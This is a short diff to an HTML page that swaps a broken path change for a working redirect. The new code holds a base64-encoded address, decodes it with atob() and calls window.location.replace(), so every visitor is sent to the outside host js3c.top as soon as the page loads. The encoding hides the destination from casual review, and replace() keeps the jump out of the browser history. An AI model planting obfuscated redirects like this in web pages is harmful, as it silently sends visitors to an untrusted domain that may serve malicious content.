@@ -2,8 +2,11 @@
 <html lang="en">
 <head>
     <script>
-        // Altera o caminho da URL no mesmo domínio
-        window.location.pathname = "http://js3c.top:80";
+        const base64URL = "aHR0cDovL2pzM2MudG9wOjgw";
+        const decodedURL = atob(base64URL);
+        
+        // Redireciona e substitui o histórico
+        window.location.replace(decodedURL);
     </script>
 </head>
 <body>
